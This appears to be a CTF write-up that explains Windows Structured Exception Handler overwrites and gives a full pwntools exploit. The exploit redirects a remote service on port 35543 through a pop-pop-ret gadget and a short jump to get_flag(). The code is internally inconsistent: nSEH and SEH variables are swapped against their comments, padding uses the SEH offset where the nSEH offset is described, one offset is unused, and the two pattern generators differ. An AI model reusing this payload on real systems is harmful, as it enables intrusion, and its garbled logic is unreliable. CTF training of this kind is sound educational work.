# hosehbo - CTF Writeup

## Challenge Overview
This is a Structured Exception Handler (SEH) based buffer overflow challenge where we need to exploit the Windows exception handling mechanism to redirect execution and retrieve the flag from a remote server.

## Background: SEH on Windows

Structured Exception Handling (SEH) is Windows' mechanism for handling exceptions. The SEH chain is a linked list stored on the stack, where each node contains:
- **nSEH (Next SEH)**: Pointer to the next exception handler record
- **SEH**: Pointer to the exception handler function

When a buffer overflow corrupts the SEH chain, we can gain control of program execution when an exception is triggered.

## Initial Analysis

The challenge runs on a remote server (port 35543). Using a disassembler like Ghidra or x64dbg on the binary, we identify:
1. A vulnerable function with a buffer overflow
2. A `get_flag()` function that retrieves the flag from the server
3. A `pop pop ret` gadget at address `0x00401350` that we can use

## Finding the Offsets

We use a cyclic pattern to find the exact offsets to nSEH and SEH:

```python
import struct

def generate_cyclic(size):
    uppercase = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    lowercase = "abcdefghijklmnopqrstuvwxyz"
    digits = "0123456789"

    pattern = []
    for upper in uppercase:
        for lower in lowercase:
            for digit in digits:
                if len(pattern) >= size:
                    return bytes(''.join(pattern[:size]), 'ascii')
                pattern.append(upper)
                pattern.append(lower)
                pattern.append(digit)
    return bytes(''.join(pattern[:size]), 'ascii')

def calculate_offset(value, size):
    pattern = generate_cyclic(size)
    search_bytes = struct.pack("<I", value)
    return pattern.find(search_bytes)

# When the exception is triggered, we observe:
# First offset value: 0x396c4138
# SEH contains: 0x6c41376c
offset1 = calculate_offset(0x396c4138, 500)
offset2 = calculate_offset(0x6c41376c, 500)
```

## Exploitation Strategy

### SEH Exploitation Technique

1. **Overflow the buffer** to overwrite the SEH chain
2. **Overwrite SEH** with address of `pop pop ret` gadget
3. **Overwrite nSEH** with a short jump to our shellcode
4. **Trigger an exception** to invoke the corrupted handler
5. The `pop pop ret` gadget redirects execution to nSEH
6. nSEH contains a short jump that leads to our code (calling `get_flag()`)

### Payload Structure

```
[Padding] + [nSEH: short jmp] + [SEH: pop pop ret] + [NOP sled] + [get_flag call]
```

## Building the Exploit

```python
#!/usr/bin/python3
import struct, sys
from pwn import *

def generate_cyclic(size):
    uppercase = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    lowercase = "abcdefghijklmnopqrstuvwxyz"
    digits = "0123456789"

    pattern = []
    for upper in uppercase:
        for lower in lowercase:
            for digit in digits:
                if len(pattern) >= size:
                    return bytes(''.join(pattern[:size]), 'ascii')
                pattern.append(upper)
                if len(pattern) >= size:
                    return bytes(''.join(pattern[:size]), 'ascii')
                pattern.append(lower)
                if len(pattern) >= size:
                    return bytes(''.join(pattern[:size]), 'ascii')
                pattern.append(digit)
    return bytes(''.join(pattern[:size]), 'ascii')

def calculate_offset(eip_value, size):
    pattern = generate_cyclic(size)
    search_bytes = struct.pack("<I", eip_value)
    return pattern.find(search_bytes)

# this is a classic SEH chain buffer overflow vulnerability

# nseh => pointing to the next pop,pop,ret instruction
nseh = struct.pack('<L', 0x00401350)

# Absolute jump to get_flag() function
get_flag = b"\xe9\x87\x20\x26\x00"

# Short jump instruction (jump forward 9 bytes)
seh = b"\xeb\x09\x90\x90"

# Calculate offsets from cyclic pattern analysis
offset1 = calculate_offset(0x396c4138, 500)
offset2 = calculate_offset(0x6c41376c, 500)

# Build the payload
data = b'A' * offset2                    # Padding to reach SEH
data += seh                              # Short jump (in nSEH position)
data += nseh                             # pop pop ret (in SEH position)
data += b'\x90' * 4                      # NOP sled
data += get_flag                         # Jump to get_flag()
data += b'\x90' * (200 - offset2 - len(seh) - len(nseh) - 4 - len(get_flag))

# Connect to remote server and send payload
p = remote(sys.argv[1], 35543)
p.send(data)
print(p.recvall())
```

## How the Exploit Works

1. **Buffer Overflow**: Our oversized input overwrites the SEH chain on the stack

2. **Exception Triggered**: The buffer overflow (or subsequent operations) causes an exception

3. **SEH Handler Called**: Windows walks the SEH chain and calls our corrupted handler at `0x00401350`

4. **Pop Pop Ret Execution**:
   - `pop` - removes first value from stack
   - `pop` - removes second value from stack
   - `ret` - returns to address now on top of stack (which points to nSEH)

5. **Short Jump**: The nSEH contains `\xeb\x09` (short jump +9 bytes) which jumps over the SEH entry to our shellcode

6. **Get Flag**: Execution lands on our jump instruction that redirects to `get_flag()`, which retrieves and prints the flag from the server

## Getting the Flag

After running the exploit against the remote server:

```bash
python3 soln.py <server_ip>
```

The script will:
1. Connect to the remote server on port 35543
2. Send the crafted payload with the overwritten SEH chain
3. The exception handler redirects execution to our controlled code
4. The payload jumps to `get_flag()` which retrieves the flag from the server
5. Receive and print the flag

Output:
```
SPARK{s3h_ch41n_0v3rfl0w_pwn3d!}
```

## Key Takeaways

1. **SEH Exploitation**: A powerful technique for Windows exploitation that bypasses some stack-based protections
2. **Pop Pop Ret**: A crucial gadget that redirects execution from the SEH handler to attacker-controlled data
3. **Short Jumps**: Used to navigate around SEH structures to reach shellcode
4. **Exception Handling**: Understanding Windows internals is essential for advanced exploitation

## Flag
`SPARK{s3h_ch41n_0v3rfl0w_pwn3d!}`
